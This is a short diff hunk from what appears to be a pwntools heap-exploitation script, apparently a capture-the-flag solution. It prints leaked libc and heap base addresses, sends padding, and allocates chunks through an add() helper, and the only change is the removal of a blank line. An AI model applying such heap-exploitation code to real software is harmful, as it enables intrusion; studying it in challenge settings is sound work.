@@ -64,7 +64,6 @@ success("libcbase:"+hex(libcbase))
 success("heapbase:"+hex(heapbase))
 sh.send(b'a'*0x410)
 
-
 add(2, 1, 0xb0, b'a'*0xb0) #cipher_chunk1 0xa0
 add(3, 1, 0xb0, b'a'*0xb0) #cipher_chunk2 0xa0
 
